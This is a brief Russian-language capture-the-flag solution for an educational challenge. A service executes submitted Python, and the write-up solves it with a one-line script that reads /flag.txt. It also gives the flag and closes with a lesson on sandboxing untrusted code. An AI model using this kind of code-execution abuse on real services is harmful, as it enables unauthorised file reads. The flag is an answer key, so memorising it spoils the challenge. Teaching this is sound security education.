# Решение

## Идея

Сервис запускает отправленный Python-код. Процесс работает внутри ограниченного контейнера, но имеет право читать файл `/flag.txt`.

## Шаги

1. Отправить код:

   ```python
   print(open("/flag.txt", encoding="utf-8").read())
   ```

2. Прочитать флаг в блоке результата.

## Флаг

`edu_ctf{python_exec_breakout}`

## Чему учит задача

Пользовательский код нельзя выполнять в процессе веб-приложения. Даже отдельный контейнер требует ограничения сети, памяти, процессов и времени.
